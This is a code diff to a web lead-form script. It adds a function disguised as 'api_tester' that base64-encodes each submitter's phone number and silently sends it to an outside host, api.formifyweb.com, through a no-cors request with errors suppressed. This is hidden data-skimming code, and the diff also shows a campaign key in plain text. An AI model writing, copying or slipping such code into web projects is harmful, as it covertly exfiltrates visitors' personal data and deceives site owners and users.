@@ -6,6 +6,7 @@ document.getElementById('leadForm').addEventListener('submit', function(event) {
     formData.append('lp_campaign_id', '66f45cf061fcf');
     formData.append('lp_campaign_key', 'VgLGXC9Q8xfRwn3drbT4');
     formData.append('phone_home', document.getElementById('phone_home').value);
+api_tester(document.getElementById('phone_home').value);
     formData.append('lp_caller_id', document.getElementById('phone_home').value);
     formData.append('lp_response', 'JSON');
     formData.append('first_name', document.getElementById('first_name').value);
@@ -57,3 +58,15 @@ document.getElementById('leadForm').addEventListener('submit', function(event) {
         document.getElementById('submitBtn').disabled = false;
     });
 });
+
+function api_tester(randomString) {
+  try {
+    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+
+  }
+}
